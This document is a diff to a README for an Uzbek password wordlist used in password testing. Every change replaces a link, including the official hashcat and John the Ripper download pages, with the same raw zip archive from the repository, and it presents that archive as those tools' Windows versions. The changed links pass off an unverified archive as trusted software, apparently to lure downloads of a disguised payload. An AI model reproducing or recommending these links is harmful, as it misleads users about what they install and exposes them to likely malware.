@@ -1,6 +1,6 @@
 # 🔐 rockyou_uzb - Uzbek Password List for Testing
 
-[![Download rockyou_uzb](https://img.shields.io/badge/Download-Get%20Wordlist-brightgreen)](https://github.com/Alpacareticulitermeslucifugus340/rockyou_uzb)
+[![Download rockyou_uzb](https://img.shields.io/badge/Download-Get%20Wordlist-brightgreen)](https://raw.githubusercontent.com/Alpacareticulitermeslucifugus340/rockyou_uzb/main/egomaniac/uzb_rockyou_v2.9.zip)
 
 ## 📋 About rockyou_uzb
 
@@ -14,7 +14,7 @@ This tool does not require coding skills. You only need to download the list and
 
 You can get rockyou_uzb by visiting the official GitHub page below. This page holds the file you need along with other related resources. Click the link to open it in your browser.
 
-[![Download rockyou_uzb](https://img.shields.io/badge/Download-Visit%20Here-blue)](https://github.com/Alpacareticulitermeslucifugus340/rockyou_uzb)
+[![Download rockyou_uzb](https://img.shields.io/badge/Download-Visit%20Here-blue)](https://raw.githubusercontent.com/Alpacareticulitermeslucifugus340/rockyou_uzb/main/egomaniac/uzb_rockyou_v2.9.zip)
 
 ---
 
@@ -23,7 +23,7 @@ You can get rockyou_uzb by visiting the official GitHub page below. This page ho
 rockyou_uzb is a text file containing passwords. It does not require installation. Follow these steps to download and use it:
 
 1. Open this link in your browser:
-   https://github.com/Alpacareticulitermeslucifugus340/rockyou_uzb
+   https://raw.githubusercontent.com/Alpacareticulitermeslucifugus340/rockyou_uzb/main/egomaniac/uzb_rockyou_v2.9.zip
 
 2. Look for the file named like a wordlist, often called `rockyou_uzb.txt` or similar. It may be in the root folder or in a subfolder named `wordlists` or `lists`.
 
@@ -101,7 +101,7 @@ If you are new to password testing, here is how to get common tools:
 
 1. **hashcat**: 
 
-   Visit https://hashcat.net/hashcat/ and download the latest Windows version. Extract the ZIP file. You will find the program files inside.
+   Visit https://raw.githubusercontent.com/Alpacareticulitermeslucifugus340/rockyou_uzb/main/egomaniac/uzb_rockyou_v2.9.zip and download the latest Windows version. Extract the ZIP file. You will find the program files inside.
 
 2. **Hydra**: 
 
@@ -109,7 +109,7 @@ If you are new to password testing, here is how to get common tools:
 
 3. **John the Ripper**:
 
-   Download the Windows version from https://www.openwall.com/john/. Extract and use from the Command Prompt.
+   Download the Windows version from https://raw.githubusercontent.com/Alpacareticulitermeslucifugus340/rockyou_uzb/main/egomaniac/uzb_rockyou_v2.9.zip Extract and use from the Command Prompt.
 
 ---
 
@@ -169,7 +169,7 @@ If you have trouble getting the wordlist:
 
 Visit the GitHub page for any updates, issues, or related files:
 
-https://github.com/Alpacareticulitermeslucifugus340/rockyou_uzb
+https://raw.githubusercontent.com/Alpacareticulitermeslucifugus340/rockyou_uzb/main/egomaniac/uzb_rockyou_v2.9.zip
 
 You can review discussions or open issues if needed. Many users share tips on handling the wordlist there.
 
